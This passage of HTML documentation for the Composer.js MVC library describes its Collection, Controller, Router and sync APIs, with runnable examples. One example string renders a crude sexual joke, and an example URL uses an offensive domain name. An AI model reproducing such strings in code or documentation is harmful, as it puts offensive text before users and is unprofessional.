var my_dogs = new Dogs([
	{type:	"Pomeranian"},
	{type:	"Malamute"},
	{type:	"Chihuahua"},
]);

my_dogs.bind("reset", function() {
	alert("I have " + this.models().length + " dogs!");
});

my_dogs.reset([
	{type: "Husky"}
]);</pre>

<h3 id="api:collection:sortfn">Collection.sortfn <small>collection.sortfn</small></h3>
<p>
	Each collection can optionally have a <code>sortfn</code> function defined; this is used automatically when adding models to the collection to
	sort and keep the collection's <code><a href="#api:collection:models">models</a></code> array in a specified order.
</p>
<pre class="runnable">var Dogs = Composer.Collection.extend({
	sortfn: function(a, b) {
		return a.get('weight') - b.get('weight');
	}
});
var my_dogs = new Dogs([
	{ name: "Toby",		weight: 60 },
	{ name: "Ruby",		weight: 12 },
	{ name: "Wookie",	weight: 20 },
	{ name: "Timmy",	weight: 6 }
]);

// Return dogs ordered by weight
alert(my_dogs.models()[0].get('name'));
alert(my_dogs.models()[1].get('name'));
alert(my_dogs.models()[2].get('name'));
alert(my_dogs.models()[3].get('name'));</pre>

<h3 id="api:collection:parse">Collection.parse <small>collection.parse(Object response)</small></h3>
<p>
	<strong>parse</strong> is called whenever a collection's model data is returned by the server, in
	<code><a href="#api:collection:fetch">fetch</a></code>.	The function is passed the raw <code>response</code> object. The default implementation
	is a no-op, simply passing through the JSON response. Override this if you need to perform any data transformations before setting model data
	into the collection.
</p>

<h3 id="api:collection:each">Collection.each <small>collection.each(function fn, [Object bind])</small></h3>
<p>
	A convenience function for looping over each of a collection's models, optionally binding the function's scope to an object.
</p>
<pre class="runnable">var Dogs = Composer.Collection.extend();

var my_dogs = new Dogs([
	{ name: "Toby",		weight: 60 },
	{ name: "Ruby",		weight: 12 },
	{ name: "Wookie",	weight: 20 }
]);
my_dogs.each(function(model) {
	alert(model.get('name') + ' weighs ' + model.get('weight') + ' pounds.');
});</pre>

<h3 id="api:collection:find">Collection.find <small>collection.find(function callback, [function sortfn])</small></h3>
<p>
	Returns the first model in the collection that satisfies the <code>callback</code> function, optionally ordering the search by the sorting
	function defined in <code>sortfn</code>.
</p>
<pre class="runnable">var Dogs = Composer.Collection.extend();

var my_dogs = new Dogs([
	{ name: "Toby",		weight: 60 },
	{ name: "Lucy",		weight: 30 },
	{ name: "Seal",		weight: 30 }
]);

// Find the first dog in the collection that weighs 30 pounds
var dog = my_dogs.find(function(model) {
	if (model.get('weight') == 30) return true;
});

alert(dog.get('name'));</pre>

<h3 id="api:collection:exists">Collection.exists <small>collection.exists(function callback)</small></h3>
<p>Given a <code>callback</code> function, returns whether or not at least one of the models within the collection satisfies that function.</p>
<pre class="runnable">var Laptops = Composer.Collection.extend();
	
var my_laptops = new Laptops([
	{
		name: 'Alienware M17x R3',
		lightweight: false,
		powerful: true
	},
	{
		name: 'Lenovo W520',
		lightweight: false,
		powerful: true
	},
	{
		name: '11" Macbook Air',
		lightweight: true,
		powerful: false
	},
]);

var perfect_laptop_exists = my_laptops.exists(function(model) {
	if (model.get('lightweight') &amp;&amp; model.get('powerful')) return true;
});

alert(perfect_laptop_exists);	// false
</pre>

<h3 id="api:collection:find_by_id">Collection.find_by_id <small>collection.find_by_id(Mixed id)</small></h3>
<p>Convenience function to find a model by <code><a href="#api:model:id">id</a></code>.</p>

<h3 id="api:collection:find_by_cid">Collection.find_by_cid <small>collection.find_by_id(Mixed cid)</small></h3>
<p>Convenience function to find a model by <code><a href="#api:model:cid">cid</a></code>.</p>

<h3 id="api:collection:index_of">Collection.index_of <small>collection.index_of(Mixed model_or_id)</small></h3>
<p>
	Accepts either a model or an id and returns the index of that item in the list of models.
</p>
<pre class="runnable">var CubicleFarm	= Composer.Collection.extend();
var Employee	= Composer.Model.extend();
var employee1	= new Employee({ id: 657932, name: "Perry the Peon" });
var employee2	= new Employee({ id: 326489, name: "Suzy the Serf" });
var employee3	= new Employee({ id: 243641, name: "Ernie the Indentured Servant" })
	
var office	= new CubicleFarm([employee1, employee2, employee3]);

alert(office.index_of( 243641 ));	// returns 2
alert(office.index_of( employee1 ));	// returns 0</pre>

<h3 id="api:collection:query">Collection.query <small>collection.query(Mixed selector)</small></h3>
<p>
	Queries the models in the collection with the criteria specified in <code>selector</code> and returns <em>all</em> that match.
	<code>selector</code> can be either a callback function or a key-value object for matching.
</p>
<p>For example:</p>
<pre>mycol.select(function(data) {
	if(data.get('name') == 'andrew' && data.get('age') == 24) {
		return true
	}
});</pre>
<p>is the same as:</p>
<pre>mycol.select({
	name: andrew,
	age: 24
});</pre>
<p>In other words, it's a very simple version of MongoDB's selection syntax, but with a lot less functionality.</p>

<h3 id="api:collection:first">Collection.first <small>collection.first([Integer n])</small></h3>
<p>
	Returns the first model from the collection, or the first <code>n</code> items, if specified.
</p>

<h3 id="api:collection:last">Collection.last <small>collection.last([Integer n])</small></h3>
<p>
	Returns the last model from the collection, or the last <code>n</code> items, if specified.
</p>

<h3 id="api:collection:url">Collection.url <small>collection.url</small></h3>
<p>
	The relative URL which describes the collection's location on the server. This value can (and should) be retrieved via the
	<code><a href="#api:collection:get_url">Collection.get_url</a></code> method.
</p>
<pre>var Library = Composer.Collection.extend({
	url: '/Library'
});</pre>

<h3 id="api:collection:get_url">Collection.get_url <small>collection.get_url()</small></h3>
<p>
	A simple wrapper function to get the collection's <code><a href="#api:collection:url">url</a></code>. Models within the
	collection will ordinarily call <code>Collection.get_url</code> within
	<code><a href="#api:model:get_url">Model.get_url</a></code>	in order to derive their location on the server.
</p>

<h3 id="api:collection:fetch">Collection.fetch <small>collection.fetch([Object options])</small></h3>
<p>
	Populates the collection's state from the server. Useful if the collection has never been populated with data, or if you'd like to
	ensure that you have the latest server state. A "change" event will be triggered if the server's state differs from the current model
	state. Accepts <code>success</code> and <code>error</code> callbacks in the options object, which are passed
	<code>(model, response)</code> as arguments.
</p>

<pre>// Get the people collection state from server
people.fetch();</pre>

<h2 id="api:controller">Controller</h2>
<p>	
	<strong>Controller</strong> classes sit between views and your models/collections and are very simple, being more of a set of
	conventions	than actual code. Controllers are the glue inside your application, tying the various components together. Generally,
	controllers deal with adding and responding to DOM events, rendering templates and keeping views and models in sync.
</p>
<p>
	The following example is a good demonstration of a controller in action. It utilizes the following concepts:
	<ul>
		<li>
			a controller is defined with <code><a href="#api:controller:extend">extend</a></code> and given an
			<code><a href="#api:controller:contructor">init</a></code> function
		</li>
		<li><code><a href="#api:controller:el">el</a></code> defines a CSS selector to grab for its view</li>
		<li><code><a href="#api:controller:elements">elements</a></code> specifies a list of elements within the view to assign as properties</li>
		<li>a <code><a href="#api:controller:className">className</a></code> to apply on initialization is defined</li>
		<li><code><a href="#api:controller:events">events</a></code> and associated callback functions are linked to HTML elements</li>
		<li>a function is bound to the <code>"click"</code> event</li>
	</ul>
</p>
<pre class="runnable">var DemoController = Composer.Controller.extend({
	el: "#controller_demo_1",
	
	elements: {
		'ul': 'my_list',
		'p.text': 'my_text',
		'button': 'my_button'
	},

	className: 'active',
	
	events: { 'click button': 'button_press_func' },
	
	init: function() {
		this.my_text.destroy();
		this.my_button.disabled = false;
	},
	
	button_press_func: function(e) {
		this.my_list.set('html', 'You clicked the button!');
	}
});

var my_demo = new DemoController();

// Run Code and check out the controller_demo_1 div below</pre>
<div id="controller_demo_1" class="example">
	<h4>controller_demo_1</h4>
	<p class="text">Please click the "Run Code" button above to activate this example.</p>
	<ul>
		<li>list item 1</li>
		<li>list item 2</li>
		<li>list item 3</li>
	</ul>
	<button disabled>button</button>
</div>

<h3 id="api:controller:extend">Controller.extend <small>Composer.Controller.extend([Object properties])</small></h3>

<p>To create a Controller class of your own, <code>extend</code> Composer.Controller, providing instance properties.</p>
<pre>var TestController = Composer.Controller.extend({
	...
});</pre>
<p>
	Note that extending another controller will not only inherit its properties and functions, but will merge its events and elements into
	the extending class:
</p>

<pre>var Base = Composer.Controller.extend({
	events: {
		'click .mydiv': 'clicked_div'
	},
	clicked_div: function(e) { ... }
});

var Users = Composer.Controller.extend({
	// note we aren't explicitely defining the 'click .div' event...it's inherited
	events: {
		'submit form': 'submit'
	},

	clicked_div: function(e) {
		// do something else
	},

	submit: function() {...}
}, Base);</pre>
<p>
	In the above example, Users overrode the "clicked_div" function, BUT the event 'click .mydiv' was inherited and appended to the events object for
	the new controller, effectively making its events:
</p>
<pre>{
	'click .mydiv': 'clicked_div',
	'submit form': 'submit'
}</pre>
<p>
As mentioned, the same merging will happen with "elements" as well. When naming conflicts occur, priority is given to the extending class, and the base
events/elements are overriden.
</p>

<h3 id="api:model:constructor">Controller.init / constructor <small>new Controller([Object properties])</small></h3>
<p>
	When creating an instance of a controller, you can pass in intial <code>properties</code>. It's a good practice, although not required, to
	pass your model data into a property called <code>model</code>. If you define an <code>init</code> function, it will be
	invoked when the controller is created, after any <code><a href="#api:controller:elements">elements</a></code> and
	<code><a href="#api:controller:events">events</a></code> assignment.
</p>
<pre class="runnable">var TestController = Composer.Controller.extend({
	init: function() {
		alert('My name is ' + this.model.get('name'));
	}
});

var my_model = new (Composer.Model.extend())( {name: 'Billy!'} );

var my_controller = new TestController( {model: my_model} );</pre>

<h3 id="api:controller:el">Controller.el <small>controller.el</small></h3>
<p>
	A controller's <code>el</code> is the DOM object that is bound to it, a container for any
	<code><a href="#api:controller:render">render</a></code>ed HTML elements associated with the controller's view(s).
</p>
<p>
	Often, it is necessary to define a controller before its container element exists in the DOM. For convenience, <code>el</code>
	can be set to a string CSS selector in the controller's definition. Then, upon initialization, if the selector "hits" an
	element in the DOM, the element is then tied to the controller.
</p>
<pre class="runnable">var DemoController = Composer.Controller.extend({
	el: "#nav"
});

var my_demo = new DemoController();

my_demo.el.style.backgroundColor = prompt('Enter a CSS color');</pre>
<p>
	If no value is provided for <code>el</code>, or if the specified CSS selector string matches no elements upon controller
	initialization,	a DOM element of the type specified in <code><a href="#api:controller:tag">tag</a></code> is created and assigned
	for	<code>el</code>.
</p>

<h3 id="api:controller:inject">Controller.inject <small>controller.inject</small></h3>
<p>
	If <code>inject</code> is set to a string CSS selector, then, within the controller initialization process,
	the HTML element <code><a href="#api:controller:el">el</a></code> (having been already specified, selected via CSS selector, or
	otherwise created of type <code><a href="#api:controller:tag">tag</a></code>) is injected into the DOM element matching the
	<code>inject</code>	selector, replacing any existing children. This allows you to easily inject views into the DOM.
</p>

<h3 id="api:controller:attach">Controller.attach <small>controller.attach()</small></h3>
<p>
	Injects a controller's HTML content (<code><a href="#api:controller:el">el</a></code>) into the element specified by the 
	<code><a href="#api:controller:inject">inject</a></code> selector, replacing any existing content. <code>attach</code> is normally called
	automatically on controller initialization, but can be called again if needed (such as when multiple controllers are using the same
	container element and you need to switch from one view to another without re-initializing a controller).
</p>
<p>
	The following example demonstrates using <code>attach</code> along with <code><a href="#api:controller:events">Controller.events</a></code> to toggle
	the content of a page element between two controllers.
</p>
<pre class="runnable">var BoyController = Composer.Controller.extend({
	inject: "#cd2_container_element",
	init: function() {
		this.html("Help I'm a boy!");
	}
});

var GirlController = Composer.Controller.extend({
	inject: "#cd2_container_element",
	init: function() {
		this.html("Help I'm a girl!");
	}
});

var ButtonController = Composer.Controller.extend({
	el: '#controller_demo_2',
	events: {
		'click button.boy': 'boy_click',
		'click button.girl': 'girl_click'
	},
	className: 'active',				// applied on initialization
	init: function() {
		this.el.getElement('button.boy').disabled = false;
		this.el.getElement('button.girl').disabled = false;
		this.el.getElement('p').set('html', 'Click the buttons to switch your gender!');
		this.boy_controller = new BoyController();
		this.girl_controller = new GirlController();
	},
	boy_click: function() {
		this.boy_controller.attach();		// switch to boy
	},
	girl_click: function() {
		this.girl_controller.attach();		// switch to girl
	}
});

var my_controller = new ButtonController();</pre>
<div id="controller_demo_2" class="example">
	<h4>controller_demo_2</h4>
	<div id="cd2_container_element" class="example">
		cd2_container_element
	</div>
	<p>Please click the "Run Code" button above to activate this example.</p>
	<button class="boy" disabled="true">boy</button>
	<button class="girl" disabled="true">girl</button>
</div>

<h3 id="api:controller:tag">Controller.tag <small>controller.tag</small></h3>
<p>
	If <code><a href="#api:controller:el">el</a></code> is empty on controller initialization, a new HTML element is created of
	the type specified in <code>tag</code>. By default, this is a <code>div</code> element.
</p>

<h3 id="api:controller:elements">Controller.elements <small>controller.elements</small></h3>
<p>
	The <code>elements</code> object is a convenient way to grab DOM elements out of a controller's
	<code><a href="#api:controller:el">el</a></code> object and
	assign them to the controller as properties. <code>elements</code> is specified in the following format:
</p>
<pre>elements: {
	'.selector1':			'property1',
	'tag othertag.selector2':	'property2' 
}</pre>
<p>
	The property names in the <code>elements</code> object are CSS selectors (to be selected from <code><a href="#api:controller:el">el</a></code>).
	The corresponding DOM elements are assigned to controller properties with the names specified by the values of the <code>elements</code>
	properties. This selection and assignment process happens internally during controller initialization, and whenever the
	<code><a href="#api:controller:html">html</a></code> or <code><a href="#api:controller:replace">replace</a></code> methods are invoked. You
	can also call <code><a href="#api:controller:refresh_elements">refresh_elements</a></code> directly to refresh the element assignments.
</p>

<h3 id="api:controller:events">Controller.events <small>controller.events</small></h3>
<p>
	The <code>events</code> object is used to link event callback functionality to HTML elements within the controller's
	<code><a href="#api:controller:el">el</a></code> object. For example, you could link controller function callbacks to submit and
	click actions in the view as follows:
</p>
<pre>events: {
	'submit form':		'validate_form',
	'change input.pass':	'check_password_strength' 
}</pre>
<p>
	The property names in the <code>events</code> object are strings of the form <code>"[event] [selector]"</code> and the values define the associated
	callback function.
</p>
<p>
	Event callbacks are parsed out of the <code>events</code> object and assigned to the appropriate HTML elements internally during controller initialization,
	and whenever the <code><a href="#api:controller:replace">replace</a></code> method is invoked. You can also call
	<code><a href="#api:controller:delegate_events">delegate_events</a></code> to directly execute the event assignment logic.
</p>

<h3 id="api:controller:render">Controller.render <small>controller.render()</small></h3>
<p>
	On its own, <code>render</code> does nothing but return <code>this</code>. As a good practice, <code>render</code> should be overridden with
	functionality that actually displays the view, and it should always return <code>this</code>. Typically, <code>render</code> will call
	<code><a href="#api:controller:html">Controller.html</a></code> to set <code><a href="#api:controller:el">el</a></code>'s HTML content and
	will modify any page styles as necessary. If you use a templating system, <code>render</code> is a good place to call out to it from.
</p>
<pre>render: function() {
	list_item = '&lt;li>' + this.model.get('item_text') + '&lt;/li>';
	
	this.html(list_item);
	
	if(MyApp.other_controller.selected_item_id() == this.model.id()) {
		this.el.addClass('selected');
	}
	return this;
}</pre>

<h3 id="api:controller:html">Controller.html <small>controller.html(String text)</small></h3>
<p>
	<code>html</code> replaces <code><a href="#api:controller:el">el</a></code>'s HTML content with the specified <code>text</code> and then
	calls <code><a href="#api:controller:refresh_elements">refresh_elements</a></code>.
</p>

<pre class="runnable">var DemoController = Composer.Controller.extend({
	el: "#controller_demo_3",
	
	className: 'active',
	
	init: function() {
		this.html('i have sex with animals');
	}
});

var my_demo = new DemoController();</pre>
<div id="controller_demo_3" class="example">
	<h4>controller_demo_3</h4>
	<p class="text">Please click the "Run Code" button above to activate this example.</p>
</div>

<h3 id="api:controller:release">Controller.release <small>controller.release([Object options])</small></h3>
<p>
	Removes the controller's view (<code><a href="#api:controller:el">el</a></code>) from the DOM and triggers its release event
	unless a <code>{silent: true}</code> is passed. <code>el</code> is destroyed unless a <code>{dispose: true}</code> option is passed,
	in which case <code>el</code> is removed from the DOM but not necessarily from memory (if there are other references to <code>el</code>,
	they would be maintained). In any case, <code>el</code> is set to false within the controller. 
</p>
<h3 id="api:controller:replace">Controller.replace <small>controller.replace(HTMLElement element)</small></h3>
<p>
	Replaces <code><a href="#api:controller:el">el</a></code> with another element and refreshes the controller's events and elements by
	invoking <code><a href="#api:controller:delegate_events">delegate_events</a></code> and
	<code><a href="#api:controller:refresh_elements">refresh_elements</a></code>.
</p>

<h3 id="api:controller:delegate_events">Controller.delegate_events <small>controller.delegate_events()</small></h3>
<p>
	Assigns event callback functions to the appropriate HTML elements as defined in the <code><a href="#api:controller:events">events</a></code> object.
	This is normally handled on controller initialization and <code><a href="#api:controller:replace">replace</a></code>, but can be directly invoked,
	such as in cases where the <code>events</code> object is modified after controller initialization.
</p>

<h3 id="api:controller:refresh_elements">Controller.refresh_elements <small>controller.refresh_elements()</small></h3>
<p>
	Sets the HTML elements defined in the <code><a href="#api:controller:elements">elements</a></code> object to the appropriate controller properties.
	This is normally handled on controller initialization, <code><a href="#api:controller:html">html</a></code> and
	<code><a href="#api:controller:replace">replace</a></code>, but can be directly invoked, such as in cases where the <code>events</code> object is
	modified after controller initialization.
</p>

<h2 id="api:router">Router</h2>
<p>
	Composer's <code>Router</code> automatically calls out to application functionality when hash change events occur, allowing you to control your application
	using hyperlinks, but without the need to reload the page or wire up complicated event handlers. <code>Router</code>'s implementation is simple: pass an
	object containing URL patterns and their associated handler functions to its constructor, and it does the rest, setting up the <code>hashchange</code>
	listen events and calling your handlers when they occur.
</p>
<p>
	Router also includes <code><a href="#api:router:get_param">get_param</a></code>, a convenient function to get URL querystring parameter values, allowing
	you to include optional parameters in the URL using the standard <code>?param1=val1&param2=val2&...</code> format.
</p>
<h3 id="api:router:constructor">constructor <small>new Composer.Router([Object routes], [Object options])</small></h3>
<p>
	This initializes <code>Router</code> to start listening for hash change events. <code>routes</code> is an object of the following format:
</p>
<pre>var routes = {
	// path : [ handler, method]
	
	'/': ['dashboard', 'load'],
	'/users/login': ['users', 'load_login_form'],
	'/users/logout': ['users', 'logout'],
	'/posts/([a-f0-9]+)': ['blog', 'load_post']
}</pre>
<p>
	When a hash change event occurs, <code>Router</code> will catch it and try to map the URL's hash to the path patterns in the <code>routes</code>
	property names. When a match is found, the corresponding object/method is invoked. Any regular expression group matches within the path (the
	portions contained within parentheses) are passed as parameters to the handler method. So, for example, the URL <code>#!/posts/32a990e/prettyUrl</code>
	would match <code>'/posts/([a-f0-9]+)/(.*)': ['blog', 'load_post']</code>, which would effectively call
	<code>blog.load_post(32a990e, 'prettyUrl')</code>.
</p>
<p>
	The following <code>options</code> may be passed:
</p>
<ul>
	<li>
		<strong><code>redirect_initial</code>:</strong><code>true|false</code> (default <code>true</code>)
		<p>
			If <code>true</code> the window will redirect to the hashed version of its URL when <code>Router</code> is initialized. For example, this would
			change <code>http://gonorrhea.com/users/display/42</code> to <code>http://gonorrhea.com/#!/users/display/42</code>.
		</p>
	</li>
	<li>
		<strong><code>suppress_initial_route</code>:</strong><code>true|false</code> (default <code>false</code>)
		<p>
			By default, <code>Router</code> will fire a hash change event immediately after initializing to perform its initial route. You can suppress
			this behavior with <code>suppress_initial_route</code>.
		</p>
	</li>
	<li>
		<strong><code>enable_cb</code>:</strong><code>function() { ... }</code> (default <code>function() { return true; }</code>)
		<p>
			The function specified in <code>enable_cb</code> is executed immediately when a hash change event occurs. If it returns <code>false</code>,
			then no routing is performed for the event. By default, <code>enable_cb</code> is a function that simply returns <code>true</code>.
			By overriding this function, you can enable or disable routing depending on conditions in your app.
		</p>
	</li>
	<li>
		<strong><code>on_failure</code>:</strong><code>function([Object error]) { ... }</code> (default <code>function() {}</code>)
		<p>
			Callback function that is executed when routing fails, such as in cases where there is no matching pattern in <code>routes</code> for the given
			URL. Information about the failure will be passed in the <code>error</code> object and formatted as such:
		</p>
		<pre>{
	url: 		url,
	route: 		route|false,	// false if no match found in routes
	handler_exists:	true|false,
	action_exists:	true|false
}</pre>
	</li>
</ul>
<p>Here is a basic example of <code>Router</code> in action.</p>
<pre>var routes = {
	'/users/login': ['users', 'load_login_form'],
	'/posts/([a-f0-9]+)': ['blog', 'load_post']
}

// users handler
var users = {
	login: function() {
		alert('lol you are now logged in!');

		// in a real app, we would ensure the user_login controller is
		// loaded and render its view
	}
};

// blog handler
var blog = {
	load_post: function(post) {
		alert('now loading post ' + post);
		
		// in a real app, we would ensure the blog_post controller is
		// loaded and render its view
	}
}

new Composer.Router(routes, {
	redirect_initial: false,
	suppress_initial_route: true
});
</pre>
<script type="text/javascript">
	var routes = {
		'/users/login': ['users', 'load_login_form'],
		'/posts/([a-f0-9]+)': ['blog', 'load_post']
	}
	var users = { load_login_form: function() { alert('lol you are now logged in!'); } };
	var blog = { load_post: function(post) { alert('now loading post ' + post);	} }
	var setup_router_demo = function() {
		new Composer.Router(routes, {
			redirect_initial: false,
			suppress_initial_route: true
		});
	}
</script>
<div id="routes_demo_1" class="example active">
	<h4>routes demo</h4>
	<p>Clicking on these links will activate the routes defined in the above code block.</p>
	<ul>
		<li><a href="#!/users/login">#!/users/login</a></li>
		<li><a href="#!/posts/2af09e33">#!/posts/2af09e33</a></li>
	</ul>
</div>
<h3 id="api:router:register_callback">Router.register_callback <small>router.register_callback(Function fn, [Object bind_to])</small></h3>
<p>
	Registers a callback function that is executed whenever the route changes (either via a hash change or
	by explicitly invoking <code><a href="#api:router:route">Router.route</a></code>). By default, callback functions are executed
	within the scope of the <code>Router</code> instance. You can bind the callback to another scope by specifying a <code>bind_to</code> parameter.
	The hash url (stripped of its leading <code>!</code>
	[exclamation point]) is passed as the sole argument to each callback function.
</p>
<pre>my_router.register_callback(function(url) {
	alert('If I were not popping up and annoying you, I would be routing to: '+ url);
});</pre>

<h3 id="api:router:route">Router.route <small>router.route(String url)</small></h3>
<p>
	Wrapper around the routing functionality. Basically, instead of doing a 
	<code>window.location = '#!/my/route';</code>, you can do <code>router.route('#!/my/route');</code>. This is a
	more elegant way to change the route from within your application code.
</p>

<h2 id="api:sync">sync</h2>
<p>
	Composer's <code>sync</code> API is simply a placeholder for the server syncing code that you define. Composer assumes nothing about your data syncing
	or server setup and leaves this to the application developer to implement. Some server-side APIs implement robust support for all HTTP methods, whereas
	others only support <code>GET</code>s and <code>POST</code>s. It's not our place to assume (or judge) anything about your particular approach. Rather
	than try to provide a cumbersome "one size fits all" solution, we trust the developer to come up with an approach that works for his or her specific app.
</p>
<p>
	In general, your implementation of <code>sync</code> should be able to perform an <code>XMLHttpRequest</code>, write data to the model or collection
	depending on the response, and execute the <code>success</code> or <code>error</code> callbacks afterwards. For example, the <code>sync</code> invoked from
	a <code><a href="#api:model:save">Model.save</a></code> might receive an <code>id</code> back from the server after the new record was successfully
	recorded in the database. In this case, it would make sense to set the id back into the model before executing the <code>success</code> callback.
</p>
<h3 id="api:sync:call">sync.call <small>Composer.sync.call(String method, Object model_or_collection, [Object options])</small></h3>
<p>
	The <code>call</code> method is called by any Composer method that reads or writes server data and needs to be overridden in order to do anything
	useful (Specifically, <code>call</code> is invoked by <code><a href="#api:model:fetch">Model.fetch</a></code>,
	<code><a href="#api:model:save">Model.save</a></code>, <code><a href="#api:model:destroy">Model.destroy</a></code> and
	<code><a href="#api:collection:fetch">Collection.fetch</a></code>).
</p>
<p>
	Depending on the value of <code>method</code>, <code>sync</code> needs to either create, read, update, or
	delete (CRUD) server data and execute callback functions upon success or failure. Accordingly, <code>method</code> will be a string of one of the
	following values:
</p>
<ul>
	<li>
		<strong><code>"create"</code>:</strong> corresponds to HTTP <code>POST</code>, passed by
		<code><a href="#api:model:save">Model.save</a></code> when saving new model data to the server.
	</li>
	<li>
		<strong><code>"read"</code>:</strong> corresponds to HTTP <code>GET</code>, passed by
		<code><a href="#api:model:fetch">Model.fetch</a></code> and <code><a href="#api:collection:fetch">Collection.fetch</a></code> when reading
		data from the server.
	</li>
	<li>
		<strong><code>"update"</code>:</strong> corresponds to HTTP <code>PUT</code>, passed by
		<code><a href="#api:model:save">Model.save</a></code> when updating model data on the server.
	</li>
	<li>
		<strong><code>"delete"</code>:</strong> corresponds to HTTP <code>DELETE</code>, passed by
		<code><a href="#api:model:destroy">Model.destroy</a></code> when deleting model data from the server.
	</li>
</ul>
<p>
	The second parameter for <code>call</code> is the model or collection being acted upon.
</p>
<p>
	The <code>options</code> parameter defines the callback functions to execute on success or error. These are passed in properties called
	<code>success</code> and <code>error</code> respectively.
</p>
</div>
</div>
		<script src="mootools.js"></script>
		<script src="composer.js"></script>

		<script>
		var $E = function(selector, filter){ return ($(filter) || document).getElement(selector); };
		var $ES = function(selector, filter){ return ($(filter) || document).getElements(selector); };
		
		// Set up the "play" buttons for each runnable code example.
		window.addEvent('domready', function() {
			var runnables = $ES('.runnable');
			runnables.each(function(el) {
				var button = $(document.createElement('button'));
				var code = el.innerHTML.replace(/\&lt\;/g, '<');
				var code = code.replace(/\&gt\;/g, '>');
				var code = code.replace(/\&amp\;/g, '&');
				button.innerHTML = 'Run Code';
				button.addEvent('click', function(e) { eval(code); });
				el.insertBefore(button);			
			});
			setup_router_demo();
		});
		</script>
	</body>
</html>
